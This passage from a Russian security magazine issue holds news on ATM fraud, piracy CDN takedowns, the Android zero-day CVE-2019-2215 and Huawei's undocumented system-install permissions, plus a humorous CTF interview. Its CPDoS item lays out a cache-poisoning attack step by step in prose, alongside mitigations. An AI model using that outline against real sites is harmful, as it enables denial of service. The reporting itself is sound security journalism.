   успешное ограбление.

  В первом полугодии 2019 года европейские банки сообщили всего о 35 инцидентах, связанных
   с атаками малвари и джекпоттингом (они же атаки black box или логичес кие атаки). Вредонос‐
   ное ПО использовалось только в 3 случаях, остальное пришлось на black box атаки.

  В результате потери финансовых организаций снизились на 100% (с 0,25 мил лиона евро
   до 0,00 миллиона евро), хотя в одном случае и был зафиксирован небольшой ущерб, в раз‐
   мере менее 1000 евро.





  Физические атаки на устройства  (грубая сила, атаки с помощью транспортных средств
   или взрывчатки) тоже поз воляют мошенникам похищать весьма скромные суммы: обычно меж‐
   ду 9000 и 15 000 евро.

   Зато настоящим трендом стали атаки TRF — Terminal-Related Fraud, то есть атаки, связан‐
   ные с терминалом. Эта категория включает в себя использование скиммеров и таких методов,
   как мошенничество с отменой транзакций. Такие методы приносят преступникам от 250
   до 350 миллионов евро в год.

   Атаки на отмену транзакций и вовсе стали преобладающей формой мошенничес тва: на их долю
   приходится 5649 случаев в первой половине 2019 года (45% всех слу чаев мошенничес тва
   с банкоматами вооб ще) по сравнению с 2292 случаями в прошлом году.





 СНИЖЕНИЕ
 ПИРАТСТВА
  Издание TorrentFreak рас ска зало о прекращении работы крупного CDN‐про‐
  вайдера Moonwalk, закрытия которого добились антипиратские объединения
  BREIN, MPA и ACE.
     Впервые издание обратило внимание на Moonwalk еще в начале текуще го
   года, когда специалисты компании Group‐IB сооб щили журналис там, что
  Moonwalk — это практически монополист в сфере поставок пиратского кон‐
   тента, чьими услугами пользуют ся тысячи сайтов. Фактически CDN‐пле ер
  Moonwalk мог быть раз мещен на бесконечном количестве пиратских ресур‐
   сов, и все они брали видео из одного источни ка. Эксперты говорили, что CDN
  Moonwalk, начав ший работу в 2013 году, агрегировал 33 490 фильмов и сери‐
   алов, а плата составляла 0,60 доллара за 1000 просмотров. Так как боль‐
  шинство серверов Moonwalk были расположены за пре делами России (в час‐
  тности, в Нидерландах), доб рать ся до них было затруднительно.
    Однако теперь, спус тя нес колько месяцев, оказалось, что голландская
  антипиратская группа BREIN сумела с этим спра виться. Глава BREIN Тим Куик
   (Tim Kuik) подтвер дил изда нию TorrentFreak, что 19 октября 2019 года прис‐
  тавы передали судебные приказы пяти сторонним хос тинг‐провайдерам, пот‐
  ребовав от них отключить потоковые серверы и сохранить все улики, связан‐
  ные с работой Moonwalk.
     Три судебных решения были адресова ны голландским компаниям, а еще
  два «формально иностранным компаниям», чьи серверы также находятся
   в Нидерландах. И хотя лидером этой операции выступили представители
  BREIN, их также поддержала Американская ассоциация кинокомпаний (Mo‐
   tion Picture Association, MPA) и антипиратский аль янс Alliance for Creativity
  and Entertainment (ACE).
     BREIN сообщает, что Moonwalk обеспечивал пиратам не только необ‐
  ходимый для работы бэкенд, но и огромные объемы контента, которым поль‐
  зовались примерно 80% извес тных российских стри минговых сайтов. По дан‐
  ным организации, топ‐50 этих сайтов генерировали 395 мил лионов посеще‐
  ний от 89,9 миллиона уникальных посетителей в месяц, а значит, индус трия
  теряла из‐за этого сотни миллионов долларов.
     Судя по всему, в нас тоящее время уси лия пра вообладателей были нап‐
  равлены на прекращение работы Moonwalk и сбор всевозможных доказа‐
   тельств о его деятельнос ти. Также предположительно BREIN, MPA и ACE
  интересуют операторы Moonwalk. Официальный сайт Moonwalk уже прек‐
  ратил работу и показывает заявление о том, что он был закрыт BREIN нав‐
  сегда и не возобновит работу.





  Представители Group‐IB пишут, что, по обновленным данным, CDN агрегиро‐
  вал 42 807 фильмов (из них 14 549 сериалов) и позволял автоматизировать
  размещение контента на стра ницах пиратских сайтов. Эксперты рассказыва‐
   ют:



         «Большая часть пиратского андегра унда любит CDN за то, что эти
        провайдеры агре гиру ют  у себя сотни тысяч файлов, содер жащих
        фильмы и сериалы, и пре дос тавляют техничес кий сер вис, поз воля-
       ющий автоматизировать раз мещение этого контента на стра ницах
         пиратских сайтов. Некоторые из таких техничес ких провайдеров CDN
          так же пре дос тавляют веб‑модули для  автозаполнения пос терами,
        описаниями фильмов, в особых слу чаях пос тавляются даже уникаль-
        ные рецензии. В начале 2019 года мы делились показа тельными циф-
         рами: 80% пиратских фильмов смотрят в онлайне (стрим), а для сери-
         алов эта циф ра уже близ ка к 90%.
           Та кой  „технопрорыв“ дал пиратам в десятки раз больше  воз-
        можнос тей для биз неса и, соответс твенно, заработка. Теперь уже ник-
         то не дорожит своим доменом, своей площад кой, блокиров ки —
        не  угроза. Пират  регис трирует  десяток доменных  имен,  контент
         на этих пор талах раз меща ется автоматичес ки, а в слу чае блокиров ки
        пор тала поис ковые рейтинги  „скле иваются“ с новым веб‑сайтом.
        Это поз воляет сохранить топ‑позиции в результатах выдачи поис-
         ковых сис тем, даже если пер вичный ресурс попал под блокиров ку.
        Законом это не зап рещено».

  При этом в Group‐IB уверены, что закрытие Moonwalk поможет значительно
  сдержать пиратский биз нес и умень шит распространение пиратских копий
   в России, но только в краткосрочной перспективе. В долгосрочной перспек‐
   тиве место Moonwalk займут его конкуренты. Ведь если стоимость ежемесяч‐
  ного   содержания   такой   CDN‐инфраструктуры   составляет   поряд‐
   ка 100 000 долларов, то доходы исчисляются миллионами.
    В настоящее время HDGO (второй по размеру CDN в РФ) тоже прекратил
  свое существование. Третий по величине CDN, kodik, потерял значительную
   часть контента, прежде всего сериального,  так  как использовал часть
  инфраструктуры Moonwalk (согласно их взаимным договоренностям).
    С учетом закрытия HDGO и Moonwalk, а также час тичного «падения» kodik,
  по данным компании, пос тра дали 80%  пиратских  онлайн‐кинотеатров.
   Теперь, после закрытия Moonwalk и HDGO, на территории России незакон‐
  ной дистрибуцией видеоконтента занимаются порядка одиннадцати пират‐
   ских CDN‐провайдеров, один из которых — неназ ванный крупный поставщик,
  по объему сопоставимый с Moonwalk.
     Позже, в конце октября, эксперты Group‐IB сообщили, что впервые за пять
   лет рынок интернет‐пиратс тва в Рос сии не толь ко остановился в росте, но и
  показал падение. Его объем сос тавил 63,5 миллиона дол ларов США, что
  на 27% ниже показателя 2018 года.





  Среди основных причин обвала доходов рос сийских интернет‐пиратов
  эксперты перечислили удар по рекламной модели монетизации пиратских
  ресурсов, падение «боль шой тройки» пиратских CDN, снабжавшей контентом
  до 90% онлайн‐кинотеатров России и СНГ, а также совершенствование
  законодательного поля и антипиратский меморандум.


  148 ИЗ 160 ВАРИАЦИЙ ШИФ РОВАЛЬЩИКА STOP МОЖНО
 ДЕШИФРОВАТЬ

   Специалисты компании Emsisoft выпустили бесплатную утилиту для дешифровки данных, пос‐
   традавших после атак шифровальщика STOP. В нас тоящее вре мя STOP считается одной
   из главных угроз среди вымогателей: от него уже пос традали более 116 000 подтвержден ных
   жертв, а общее число пострадавших оценивается пример но в 460 000 человек.

   Инструмент Emsisoft работает против 148 из 160 вариаций STOP, то есть должен помочь при‐
   мерно 70% жертв, которые пос традали до августа 2019 года.

   Для пострадавших, чьи данные зашифрованы при помощи 12 оставшихся вариантов вымога‐
   теля, пока нет похожих решений, но специалисты рекомен дуют пока архивировать зашиф‐
   рованные данные, так как дешифровщик может появиться в будущем.





 APPLE НЕ ШПИОНИТ
  В середине месяца по СМИ всего мира про катилась волна паничес ких сооб‐
  щений о том, что ком пания Apple переда ет данные пользователей Safari
   китайской компании Tencent. Представители Apple выступили с заявлением
  и объяснили, что ничего страшного не происхо дит, все дело в недавнем
  обновлении Safe Browsing.



         «Apple защища ет конфиденциальность пользовате лей и ваши данные
         с помощью Safari Fraudulent Website Warning, функции безопас ности,
         которая отме чает извес тные вре донос ные сайты. Когда данная фун-
         кция активна, Safari све ряет URL-адрес сайта со спис ками извес тных
         сайтов  и  показы вает  пре дуп режде ние,  если  URL-адрес,  который
        посеща ет пользователь, подоз рева ется в мошенничес ких действиях,
         нап ример фишинге.
        Для выполнения этой задачи Safari получа ет список извес тных вре-
        донос ных сайтов от Google, а для устройств с кодом региона матери-
         кового Китая список пре дос тавляет Tencent. Фак тичес кий URL-адрес
        посеща емого вами сайта никогда не переда ется пос тавщику безопас-
         ного  прос мотра,  и  эту  функцию  можно  отклю чить», —  гла сит
        пресс‑релиз Apple.

  В сущности, все сооб щения прессы сво дились к тому, что в Safari незаметно
  появилась вторая система безопас ного прос мотра, названная в честь защит‐
  ного механизма Google Safe Browsing. Прин цип работы такой системы прост:
  URL, который собирается посетить пользователь, предварительно проверя‐
   ется по спискам известных вредоносных сайтов.


                                        Продолжение статьи →
← Начало статьи





  На протяжении многих лет Apple применя ла API Google Safe Browsing в Safari
  для проверки ссылок. Но в этом году компания добавила в браузер аналогич‐
  ную  систему  безопасного  браузинга  от  китай ской  компании  Tencent.
  В результате чего СМИ, на волне многочисленных скандалов, свя занных
  с протестами в Гонконге, пос пешили сообщить, что Apple собирает и переда‐
   ет в Китай едва ли не всю историю бра узеров пользовате лей.
     Нужно понимать, что раньше защитные механиз мы действительно переда‐
  вали URL‐адреса пользователей провайдерам Safe Browsing, а те проверяли
  ссылки  по  своим  уда ленным  базам  вредонос ных  сайтов. Но  теперь
   это работает иначе. Так, механизмы Google и Tencent, по сути, передают
  копию своих БД браузеру пользователя, а тот сверяет URL с этой локальной
   базой. Разработ чики Apple подчеркивают, что внедренные в Safari механизмы
  безопасного просмотра работают имен но так и никогда не передавали дан‐
  ные пользователей на сто рону.
    Более  того,  как оказалось, Tencent не является пос тавщиком  услуг
  безопасного просмотра по умолчанию. Судя по всему, к решениям китайской
  компании прибегают лишь тогда, когда на устройстве включен китайский
   язык. Напомню, что домены и сервисы Google в Китае блокированы, а значит,
  там  пользователи  Safari не  могут  получать  базу вредоносных ссылок
   от Google и соответствующие обновления. Поэтому в качестве альтернативы
  для китайских пользователей появились услуги Tencent.
    В ответ на это обеспокоенные пользователи и ИБ‐эксперты отмечают, что
  теперь у Tencent есть воз можность видеть IP‐адреса пользователей (тех, что
  используют устрой ства с нас тройками матери кового Китая). И Apple акти‐
  вирует эту функцию по умолчанию, не предупреждая пользователей. К при‐
   меру, известный ИБ‐специалист Мэттью Грин (Matthew Green), доцент кафед‐
  ры информатики в Институте Джонса Хопкинса, в своем блоге подверг кри‐
   тике API безопасного прос мотра в целом, в том чис ле и от Google. По словам
  Грина, ИБ‐сообщество с тру дом соглашается на компромисс в виде Google
   Safe Browsing API, однако Tencent — это не Google.



         «Хотя они [Tencent] вполне могут быть зас лужива ющими доверия, мы
         зас лужива ем, чтобы нас информирова ли об изме нениях такого рода
        и давали воз можность сде лать выбор в их отношении. По меньшей
        мере пользовате ли должны узна вать о таких изме нениях до того,
          как Apple запус тит функцию в продак шен и тем самым поп росит мил-
        лионы своих пользовате лей довериться ей», — пишет Грин.


  ТОРВАЛЬД НЕ ОПАСАЕТСЯ MICROSOFT
  В рамках мероприятия Linux Plumbers Conference Линус Тор вальд прокомментировал действия
   компании Microsoft, которая в последнее время обращает на Linux все больше внимания и,
   по мнению многих, хотела бы контролировать Linux или вовсе унич тожить его. Торвальдс
   не согласен с этим. По его мне нию, опасать ся нечего, и, даже если мнение Microsoft расходит‐
   ся с мнением сообщества Linux по каким‐то вопросам, это совершенно нормально.





  →«Все это анти‐Microsoft движение порой было смешным, если рассматривать его как шутку,
   но не совсем. Сегодня они [Microsoft] на самом деле стали гораз до дружелюбнее. На раз‐
   личных конференциях я часто общаюсь с инженерами Microsoft, и мне кажет ся, да, они изме‐
   нились, и инженеры рады этому. И они счастливы работать над Linux. Поэтому я полностью
   отказался от этих анти‐Microsoft настроений»
  — рассказал Торвальдс





 ОЧЕРЕДНОЙ 0‐DAY
 В ANDROID
  В начале октября 2019 года эксперты команды Google Project Zero сообщили,
   что в ядре Android обнаружен неприятный баг, из‐за которого злоумышленни‐
   ки могут получить root‐доступ к целево му устрой ству. По информации иссле‐
  дователей, эта уязвимость нулево го дня уже находится под атаками.
     Изначально уязвимость была исправлена в ядре 4.14 LTS Linux еще в
  декабре 2017 года. Это исправление вошло в ядра Android 3.18, 4.14,
   4.4 и 4.9, однако более новые версии по какой‐то причине остались уяз‐
  вимыми. В итоге уязвимость получила идентифика тор CVE‐2019‐2215 и пред‐
   ставляет угрозу для следующих моделей смартфонов под управле нием An‐
   droid 8.x и более новых версий:
   • Pixel 2 под управлением Android 9 и Android 10 preview;
   • Huawei P20;
   • Xiaomi Redmi 5A;
   • Xiaomi Redmi Note 5;
   • Xiaomi A1;
   • Oppo А3;
   • Moto Z3;
   • смартфоны Oreo LG;
   • Samsung S7, S8, S9.

   Хуже того, экспер ты писали, что экспло ит для этой уязвимости достаточно
  универсален, чтобы подойти для любой из этих моделей с минимальными
  изменениями.
     К счастью, есть и хорошие новос ти. Свежий 0‐day не получил статус кри‐
   тического, так как это не RCE‐уяз вимость, которую можно использовать
  без какого‐либо взаимодействия с пользователем. Для эксплуатации проб‐
  лемы нужно соблюсти ряд условий. Так, злоумышленнику понадобится уста‐
  новить на целевое устройство вредоносное приложение для эксплуатации
   бага. Любые другие векторы атак, например через браузер, потребу ют соз‐
   дать цепочку экспло итов с применением дру гих, дополнительных уяз вимос‐
   тей.
    Специалисты Google полагают, что замеченный ими экс плоит для CVE‐
   2019‐2215 — дело рук небезызвес тной израиль ской компании NSO Group.
  Напомню, что NSO Group была основана в 2010 году и с тех пор занимается
  разработкой различной легальной малвари, которую, наряду с эксплоитами
  для различных 0‐day, продает правитель ствам и спецслужбам по всему миру.
  Широкую известность компания получила в 2016–2017 годах, когда спе‐
  циалисты по информационной безопас ности обнаружили мощ ные шпионские
  инструменты Pegasus и Chrysaor, разработанные NSO Group и предназначен‐
  ные для iOS и Android.
     Представите ли NSO Group ответили на эти обви нения и сообщили СМИ,
   что не имеют к эксплоиту никакого отношения:



       «NSO Group не продава ла и никогда не будет продавать экс плоиты
        или  уяз вимос ти. Данный  экс плоит не име ет никакого отношения
          к NSO, а наша работа сос редоточена на соз дании продук тов, пред-
         назна ченных для лицензированных раз вед служб и пра воохранитель-
        ных органов, которые спа сают жиз ни».

  После раскрытия информа ции о проб леме специалистка Google Мэдди Стоун
  опубликовала в открытом дос тупе PoC‐эксплоит, однако ее код был в извес‐
  тной степени безобиден, так как не использовал весь потенциал уязвимости.
    Но идею развил далее Грант Эрнандес (Grant Hernandez), кандидат наук
  из Флоридского института кибербезопас ности при Университете Флориды.
  Он представил собственный PoC‐экспло ит, названный Qu1ckR00t, который
  позволяет обойти такие защит ные механизмы, как DAC (Discretionary Access
   Control) и Linux Capabilities (CAP), способен отклю чать SELinux (Security‐En‐
  hanced Linux), SECCOMP (Secure Computing Mode) и MAC (Mandatory Access
   Control). В итоге инструмент может использоваться для получения быстрого
   root‐доступа к устрой ству, предоставляя злоумышленнику пол ный контроль.
    Исходный код Qu1ckR00t был опуб ликован на GitHub, но не в виде готово‐
   го и упакованного APK‐файла. То есть пользователю придется скомпилиро‐
   вать его самостоятель но, зато пос ле он получит доступ к приложению,
  которое может обеспечить root‐доступ буквально одним нажатием. Эрнандес
  предупреждает, что тестировал Qu1ckR00t толь ко на Pixel 2 и неопытным
  пользователям лучше не эксперимен тировать с этим инс трументом, так
   как они рискуют нарушить работу ОС и потерять все данные.
     Уязвимость CVE‐2019‐2215 была устранена инженерами Google в сос таве
  октябрьского вторника обновлений для Android: патч уровня 2019‐10‐06.


  30 000 ВЫМОГАТЕЛЬСКИХ ПИСЕМ В ЧАС


  В Check Point обнаружили одну из причин роста количес тва спамерских писем, связан ных с так
   называемым сексуальным вымогательством. В английском языке для обозначения такой
   активности используют термин  sextortion, образован ный от слов sex («секс») и  extortion
   («вымогательство»).


   Оказалось, этим активно занимаются операторы ботнета Phorpiex (он же Trik). Массовые рас‐
   сылки насчитывают до 27 000 000 электронных писем за одну кампанию, то есть некоторые
   зараженные Phorpiex машины рассылали до 30 000 вредонос ных электронных писем в час.

   За пять месяцев наблюдений аналитики Check Point отследили более 14 биткойнов (пример‐
   но 115 000 долларов США), которые жертвы вымогательства переве ли в качестве выкупа
   операторам Phorpiex.

  В  настоящее  в  ботнет  Phorpiex  входят пример но 450 000 зараженных компьютеров
   под управлением Windows.





 АТАКИ НА CDN
  Эксперты из Тех нического универ ситета Кельна рас сказали о новой атаке,
  направленной на отравление веб‐кеша. Проблема представляет опасность
  для сетей доставки контента (content delivery network, CDN) и работающих
  с ними сайтов, так как может вынудить CDN кешировать, а затем обслуживать
  страницы ошибок вместо легитимных ресурсов.
     Атака получила название CPDoS (Cache‐Poisoned Denial‐of‐Service) и име‐
   ет три варианта исполнения, которые вполне могут применяться на практике.
     CPDoS‐атаки направлены на два основных компонента современного
   веба: веб‐серверы и сети доставки контента. Так, если веб‐серверы хранят
  исходный сайт и его содержимое, то CDN хранит кешированную копию
  ресурса, которая обновляется через определенные промежутки времени.
  Это помогает существенно облегчить нагрузку на веб‐серверы. Так как в
  наши дни CDN применяются очень широко, атака на систему CDN может зна‐
   чительно сказаться на доступности сайта и, следова тельно, отразиться на его
  прибыли.
     Таким образом, используя CPDoS, преступни ки могут реализовать сле‐
  дующий сценарий:
   • злоумышленник подключается к сайту до тех пор, пока его запрос не сге‐
     нерирует новую запись CDN;
   • запрос злоумышленника содержит иска женный или слишком большой
     HTTP‐заголовок;
   • CDN позволяет это му заголовку про ходить через легитимный сайт, и в
     итоге тот может быть обработан и использован для генерации веб‐стра‐
     ницы, которую кеширу ет CDN;
   • заголовок слишком большого раз мера провоцирует на веб‐сервере
    ошибку;
   • сервер генерирует стра ницу с ошиб кой (ошиб ка 400 Bad Request);
   • страница ошибки кеширу ется в CDN;
   • другие пользователи, обращающиеся к сай ту, видят страницу с ошибкой
     вместо реального сайта;
   • кешированная ошиб ка распространяется на другие узлы сети CDN, соз‐
     давая ложное отключение на легитимном сайте.





  Исследователи пишут, что существу ет три варианта CPDoS‐атак, которые
   зависят от того, как злоумышленники структуриру ют свой искаженный заголо‐
   вок: с использованием полей заголовка боль шого размера (HTTP Header
   Oversize),  метасимволов,  вызывающих ошиб ки  (HTTP  Meta  Character),
  или инструкций, которые перепишут нормаль ные ответы сервера (HTTP
  Method Override).
    Интересно, что экспертам уда лось про вести масштабные испы тания CP‐
  DoS‐атак на тестовом сайте, раз мещен ном в сети нескольких CDN‐провай‐
   деров. Так, на приведенной ниже карте видно, что злоумышленник (символ
  опасности) запускает ата ку на сервер CDN легитимного сайта (синий мар‐
   кер), а тот распространяет стра ницу с кешированной ошибкой на другие сер‐
  веры CDN (красные маркеры), отравляя большую часть сети провайдера.





  К счастью, не все веб‐серверы (реализации про токола HTTP) и CDN‐провай‐
  деры уязвимы перед ата ками CPDoS. В таб лице ниже показано, какие ком‐
  бинации сервер + CDN уяз вимы, сог ласно проведенным исследователями
   тестам.





  Владельцам сайтов не так уж трудно про тивос тоять атакам CPDoS: достаточ‐
  но настроить работу со своим провайдером CDN таким образом, чтобы стра‐
  ницы ошибок HTTP не кешировались по умолчанию. У многих пос тавщиков
   услуг CDN есть соот ветству ющие настройки в панели управления, так что
   это нетрудная задача. Также можно отключить это в файлах конфигурации
  сервера, добавив заголо вок HTTP «Cache‐Control: no‐store» к каждому типу
  страницы ошибок.
     Корень проблемы с CDN‐провайдерами лежит в сле дующем: стандарт
  веб‐кеширования допускает, что CDN кеширу ют только коды ошибок 404 Not
   Found, 405 Method Not Allowed, 410 Gone и 501 Not Implemented, тогда
   как CDN не должны кешировать страницы 400 Bad Request, генерируемые
   в ходе CPDoS‐атак. Увы, далеко не все CDN следуют стандарту, что и при‐
  водит к возникно вению проблем.
    По данным исследова телей, потенциальную уяз вимость перед атаками
  CPDoS демонстрируют 30% сайтов из списка Alexa топ‐500, 11% доменов
  Министерства обороны США и 16% адресов из 365 миллионов образцов
  URL, полученных из архива Google Big Query.


 БОЛЬШИНСТВО СПАМА ИСХО ДИТ ИЗ США, РОС СИИ
 И УКРАИНЫ

   Исследовательская группа Data 61 при Государствен ном объединении научных и прикладных
   исследований (Commonwealth Scientiﬁc and Industrial Research Organisation, CSIRO) предста‐
   вила сводный отчет, посвященный анализу самой разной вре доносной активности, от фишин га
   до атак малвари.


   Эксперты утверждают, что их отчет — первый и крупнейший обще доступный набор данных
   такого рода и строится на основании 51 600 000 различных сообщений о вре доносной
   онлайн‐активности и 662 000 уникальных IP‐адресов по всему миру.

  В своем отчете эксперты Data 61 делают ряд небезын тересных выводов.

   Более 60% всей спамерской активности в период с 2007 по 2017 год генерировали Соеди-
   ненные Штаты, Россия и Украина.

   Наиболее трудные для устранения угрозы, как правило, происходят из Китая.

   Что касается фишинга, эта активность постоянно рас тет, и в 2017 году фишинг уже составлял
  30% от общего количества всей вредонос ной активнос ти в целом.



  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

  В ноябре текущего года в Twitter запретят всю политичес кую рекламу


   На индийской АЭС обнаружи ли северокорейский вирус


   Valve ограничивает торговлю ключами CS:GO, потому что с их помощью отмы вают деньги


   «Неудаляемый» троян xHelper заразил 45 000 устройств на Android


   Массовая кибератака вывела из строя множество грузин ских сайтов


   GitLab отказался от принудительного сбора телеметрии из‐за недовольства сообщес тва


   Роботы в японских отелях могли использоваться для слежки за посетителями


   Компанию Avast пытались взломать через скомпрометирован ный VPN


   Alexa и Google Home могут использовать ся для фишинга и подслу шивать своих хозяев


   Crowdstrike: создание китайского самолета Comac C919 было сопряжено со взло мами и кибер‐
   шпионажем
HEADER

   БЛИЦ- ИНТЕРВЬЮ





       ОМАР ГАНИЕВ
             (BECHED)
              О ХАКЕРСКОМ ОПЫТЕ
                   И УЧАСТИИ В CTF





Сегодня у нас в гостях человек, который силен одновремен‐
но в CTF и вольной борьбе, участник команды LC↯BC, вхо‐
дящей в мировой топ, и исследователь с огромным опытом
за плечами — Омар Ганиев AKA beched.


             INFO

                    Серия «Блиц‐интервью» — корот кие и полушуточ‐
                     ные интервью со специалистами в области ИБ,
                      подготовленные ведущими канала @rusecmedia
                        эксклюзивно для «Хакера».



— Перед тобой вирус на JavaScript, твои действия?
— Писать статью для юных исследователей в «Хакер»!


— Расскажи о сво ей компании Deteact. Правда, что твой мно -
голетний опыт в ИБ поз воляет использовать такие инстру мен ты,
как Acunetix и sqlmap?
— Совершенно верно! Также отмечу, что ежедневные изнурительные тре‐
нировки позволяют нам быстрее всех вставлять кавычки в параметры зап‐
росов, а  знание инстру мента  Format  Painter  в MS Word обязательно
для получения позиции Senior в нашей компании.


— Чем был полезен опыт работы в компаниях по информацион ной
безопасности?
— Кому, обществу? Но ведь индус трия ИБ — это паразит на теле человечес‐
тва! Главной же персональной пользой могу назвать кру гозор, получаемый
от тестирования самых разных инфраструктур и изучения раз личных биз‐
нес‐процессов и их угроз.


— Вспомни свой первый CTF. Навыки и опыт в каких вещах помог-
ли в решении заданий? Что сто ит «про качивать» молодым спе -
циалистам?
— Конечно же, необ ходимо прокачивать хитрость, изворотливость, умение
обмениваться решениями с дру гими командами, проводить DoS‐атаки
на другие команды, эксплуатировать race condition в скорборде, подниматься
до рута на серверах тасков и воровать флаги от дру гих тасков, выпрашивать
флаги в IRC и ныть там же, искать чужие решения на Pastebin и так далее.
В общем, все как в жизни! А если серьезно, то нужно прокачивать вни матель‐
ность, усидчивость, умение читать код, зна ние большого количества тех‐
нологий и атак.


— Какими захватами вы занимаетесь, кро ме захвата флага?
— Борцовскими и рейдерскими, жи есть! Ну и захватами внимания.





  Омар Ганиев (сле ва) и Анатолий Катюшин (справа) после награждения
  на Positive Hack Days III


— В CTF получается зарабо тать? На фото выше мы насчитали
примерно 3200 руб лей. Сколько ты выиграл за последние два
года?
— Есть более козырные фотки с баксами =) Мы, как команда LC↯BC,
за 2018–2019 годы выиг рали что‐то вроде 200 тысяч долларов, так что особо
не заработаешь. Делить выигранные средства мы начали лишь недавно.
Выигрыши — просто побочный эффект, ведь CTF в первую очередь хобби,
и мы активно участвуем и в соревнованиях без призов.


— Про дол жи анек дот: «Заходят в бар три CTF-ера…»
— А бармен им говорит: «Лучше бы ресерчили!»


— Дай пять советов по ИБ для наших читате лей.
— Бросай, пока не поздно; изу чай технологии, а не только инстру менты; изу‐
чай бизнес и экономику для понимания угроз; будь толерантен к трансген‐
дерам, наркоманам, CTF‐ерам и т. д. Ну и изучай OPSEC на чужих ошибках!



        WWW

                    •Омар Ганиев в твиттере
                      •Сайт Deteact
HEADER
 ANDROID

         БЭКДОР В СМАРТФОНАХ HUAWEI
         И ОСОБЕННОСТИ РЕAЛИЗАЦИИ
                TRUSTZONE В SAMSUNG





                                                                              Евгений Зобнин
                                                                                     Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru





Сегодня в выпус ке: бэкдор в смартфо нах Huawei, иссле‐
дование устройства защищен ной среды исполне ния в смар‐
тфонах Samsung, простой и надежный способ зашифровать
данные приложения, оптимиза ция приложения для Chrome
OS, объяснение разницы между val и const val в Kotlin, а так‐
же новые инс трументы пентестинга и боль шая подборка
библиотек для разработчиков.


                ПОЧИТАТЬ


Бэк дор в смартфо нах Huawei
Huawei’s Undocumented APIs — A Backdoor to Reinstall Google Services —
статья разработчика Magisk о том, как Huawei удалось реализовать систему
установки сервисов Google Play на недавно выпущенный Huawei Mate 30.
   Напомним, что в результате развязанной президентом Трампом торговой
войны США и Китая Google была вынуждена разорвать дей ству ющие сог‐
лашения с компанией Huawei. В результате Huawei больше не может легаль‐
но устанавливать приложения Google на свои устройства.
   Казалось бы, приложения, в том числе Google Play, всегда можно доус‐
тановить из сторонних источников. Однако для их работы необходимы сер‐
висы и библиотеки Google, которые должны быть частью прошивки и не могут
быть установлены отдельно.
   Huawei оказалась в без выходной ситуации, но энту зиасты быстро выяс‐
нили, что в Сети можно найти приложение LZPlay, которое магичес ким обра‐
зом установит все необ ходимые компоненты на устройство, причем его раз‐
лочка или рутинг не понадобятся.
   Никак иначе, кроме как с помощью скры того API, реализованного Huawei,
или уязвимости, LZPlay работать не мог, и Джон Ву (John Wu), разработчик
Magisk, решил выяснить, так ли это.
   Оказалось, что LZPlay использует ряд специфичных для Huawei раз‐
решений:


<uses‐permission android:name="com.huawei.permission.sec.MDM_AP
P_MANAGEMENT"/>
<uses‐permission android:name="com.huawei.permission.sec.MDM_IN
STALL_SYS_APP"/>
<uses‐permission android:name="com.huawei.permission.sec.MDM_IN
STALL_UNDETACHABLE_APP"/>
<uses‐permission android:name="com.huawei.systemmanager.permission.
ACCESS_INTERFACE"/>

Документация сооб щает, что отдельные из этих раз решений предназначены
для использования функции MDM, при помощи которой компании контро‐
лируют устройства своих сотрудников. Но документация ничего не говорит
о двух разрешениях, которые, судя по наз вани ям, нужны для установки сис‐
темных приложе ний:


<uses‐permission android:name="com.huawei.permission.sec.MDM_IN
STALL_SYS_APP"/>
<uses‐permission android:name="com.huawei.permission.sec.MDM_IN
STALL_UNDETACHABLE_APP"/>

Учитывая то, что системный раз дел в новых устройствах Huawei всегда под‐
клю чается в режиме «только чтение», эти разрешения позволяют дать любому
стороннему приложению привилегии системных. По сути, это бэкдор.
   Но самое интересное, что использовать эти API могут только приложения,
подписанные  специальным  ключом  Huawei.  Дру гими  словами,  Huawei
не только знала о сущес твовании приложения LZPlay, но и одобрила его,
выдав разработ чикам ключ для подписи.


Осо бен ности реализации TrustZone в смартфо нах Samsung
Breaking Samsung’s ARM TrustZone — рас сказ об уязвимостях, найденных
в реализации TrustZone в смартфонах Samsung. Презентация интересна
не столько самими уязвимостями, сколько подробностями о внутренностях
системы.
   Система TrustZone представляет собой выделенную среду исполнения
внутри ARM‐совместимых чипсетов, логически не связанную с основной сре‐
дой исполнения, где работает операци онная система смартфона и поль‐
зовательские приложения. Android использует TrustZone для запуска систем
шифрования и обработки сенситивной информа ции, которая дол жна быть
защищена от третьих лиц. К TrustZone имеет доступ только ограниченный
набор привилегированных сервисов, а хранимая ей информация зашиф‐
рована и лежит в недоступной для основной сис темы памяти.
  В случае с Samsung внутри TrustZone работа ет либо операционная сис‐
тема Kinibi, разработанная компанией Trustonic (Samsung Galaxy S3–S9), либо
система TEEGRIS, за авторством инженеров самой Samsung (Samsung Galaxy
S10). В презентации речь идет только о Kinibi. Интересные факты:
 • 32‐битная микроядерная ОС;
 • разграничение пол номочий на уровне системных вызовов;
 • запускает процессы (в том числе драйверы) головной процесс RTM (Run‐
   Time Manager);
 • RTM также отвечает за коммуника цию между про цессами с помощью MCI
   (Mobicore Communication Interface);
 • приложения могут быть запущены из стандартной среды исполне ния (для
   подтверждения аутентичнос ти используются цифровые подписи);
 • приложения Kinibi вза имодействуют со стандартной средой с помощью
   разделяемой памяти, в которую записываются команды для приложений
    Kinibi;
 • драйверы реализова ны в форме обычных процессов с расширенным
   набором привилегий.





                      TrustZone в реализации Samsung


              РАЗРАБОТЧИКУ


Шифрование дан ных приложе ния
AndroidX: Security library — рас сказ о новой Jetpack‐библиотеке androidx.se‐
curity, содержащей удобные и простые инс трументы для шифрования данных
приложения.
   Библиотека вклю чает в себя два основных клас са:
 • EncryptedSharedPreferences — ана лог SharedPreferences, автоматичес ки
   выполняющий шифрование ключей и значений, записы ваемых в файл нас‐
   троек;
 • EncryptedFile выполняет автоматическое шифрование файлов с помощью
   собственных реализаций классов FileInputStream и FileOutputStream.

Пользоваться  библиотекой  очень  просто.  Подключаем  библиоте ку
с помощью Gradle:


implementation "androidx.security:security‐crypto:1.0.0‐alpha02"

Затем создаем клю чи шифрования (биб лиотека автоматически сохранит их
в KeyStore, который в современных телефонах использует защищенную среду
TEE):


val keyGenParameterSpec = MasterKeys.AES256_GCM_SPEC
val masterKeyAlias = MasterKeys.getOrCreate(keyGenParameterSpec)

Далее создаем объект класса EncryptedSharedPreferences:


val sharedPrefs = EncryptedSharedPreferences.create(
        ИМЯ_ФАЙЛА,
        masterKeyAlias,
        context,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)

